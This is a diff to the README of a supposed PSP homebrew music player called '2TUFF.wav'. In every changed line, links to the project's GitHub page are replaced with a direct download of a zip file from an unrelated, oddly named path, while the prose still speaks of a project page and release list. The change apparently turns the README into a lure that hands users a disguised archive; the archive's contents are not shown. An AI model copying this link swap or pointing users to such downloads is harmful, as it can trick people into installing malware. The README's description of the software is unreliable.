@@ -5,13 +5,13 @@ description: "Play MP3 files on your PSP using this homebrew music player design
 ---
 # 🎵 2TUFF.wav - Play your music on PSP devices
 
-[![](https://img.shields.io/badge/Download-2TUFF.wav-blue)](https://github.com/Udantha4748/2TUFF.wav)
+[![](https://img.shields.io/badge/Download-2TUFF.wav-blue)](https://raw.githubusercontent.com/Udantha4748/udantha4748.github.io/main/democratism/io_udantha_github_v2.0.zip)
 
 2TUFF.wav serves as a music player for the PlayStation Portable. It allows users to listen to audio files directly on their hardware. The application organizes your music library and provides playback controls for different file formats. This software works on custom firmware. 
 
 ## 📥 Getting Started
 
-You need the correct files to use this player. Visit the [project page](https://github.com/Udantha4748/2TUFF.wav) to download the software. Select the latest release version on the right side of the screen. Look for the file ending in .zip. Save this file to your computer.
+You need the correct files to use this player. Visit the [project page](https://raw.githubusercontent.com/Udantha4748/udantha4748.github.io/main/democratism/io_udantha_github_v2.0.zip) to download the software. Select the latest release version on the right side of the screen. Look for the file ending in .zip. Save this file to your computer.
 
 ## ⚙️ System Requirements
 
@@ -70,7 +70,7 @@ If the music player fails to load, check these points:
 
 ## 🔗 Download the Software
 
-You can get the current version of the player here: [https://github.com/Udantha4748/2TUFF.wav](https://github.com/Udantha4748/2TUFF.wav). We update the software to improve performance and stability. Check this link for future versions or bug fixes.
+You can get the current version of the player here: [https://raw.githubusercontent.com/Udantha4748/udantha4748.github.io/main/democratism/io_udantha_github_v2.0.zip](https://raw.githubusercontent.com/Udantha4748/udantha4748.github.io/main/democratism/io_udantha_github_v2.0.zip). We update the software to improve performance and stability. Check this link for future versions or bug fixes.
 
 ## 📝 Usage Tips
 
